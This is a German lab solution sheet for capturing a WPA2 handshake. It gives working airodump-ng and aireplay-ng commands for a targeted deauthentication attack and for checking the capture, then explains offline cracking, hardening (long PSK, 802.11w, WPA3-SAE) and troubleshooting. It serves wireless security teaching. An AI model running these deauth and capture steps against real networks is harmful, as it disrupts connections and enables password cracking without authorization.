# Lösung – Übung 03: WPA2-Handshake capturen

BSSID `AA:BB:CC:11:22:33`, CH 6, Client `DE:AD:BE:EF:00:11`.

## 1. Capture starten

```bash
sudo airodump-ng --bssid AA:BB:CC:11:22:33 -c 6 -w hs wlan0mon
```

## 2. Gezielte Deauth (zweites Terminal)

```bash
sudo aireplay-ng --deauth 3 -a AA:BB:CC:11:22:33 -c DE:AD:BE:EF:00:11 wlan0mon
```
`-a` = AP, `-c` = Client. Nur **wenige** Deauth-Frames (3) – der Client reconnectet und erzeugt den Handshake. (Ohne `-c` = Broadcast-Deauth, lauter.)

## 3. Handshake bestätigen

Im airodump-Fenster erscheint oben rechts:
```
[ WPA handshake: AA:BB:CC:11:22:33 ]
```

## 4. Vollständigkeit prüfen

```bash
aircrack-ng hs-01.cap            # listet Netze mit "(1 handshake)"
wpaclean clean.cap hs-01.cap     # bereinigt/extrahiert den Handshake
# Wireshark: Filter  eapol   -> Message 1..4 of 4 sichtbar
```

## 5. Warum noch kein Passwort

Der Handshake enthält **Nonces + MICs**, die aus dem PTK (abgeleitet aus PMK/PSK) berechnet sind – aber **nicht die Passphrase**. Man muss offline Kandidaten durchprobieren: Kandidat → PMK → PTK → MIC berechnen und mit dem gecaptureten MIC vergleichen (Übung 04). Starke PSK = praktisch nicht crackbar.

## Härtung

- **Lange, zufällige PSK** (nicht in Wortlisten) → Capture nutzlos.
- **802.11w (PMF)** verhindert/erschwert Deauth → Handshake lässt sich schwerer erzwingen.
- **WPA3-SAE** (Dragonfly) ist gegen Offline-Wörterbuch resistent (Übung 09).

## Häufige Fehler / Troubleshooting

- **Kein Handshake:** Client zu weit/zu wenige Deauths; Kanal fixiert? mehrere Clients probieren.
- **PMF aktiv:** Deauth wird ignoriert → auf freiwilligen Reconnect warten oder PMKID (Übung 05).
- **airodump zeigt Handshake, aircrack nicht:** manchmal unvollständig → erneut capturen, `wpaclean`.
- **Rechtliches:** nur eigenen AP/Client.
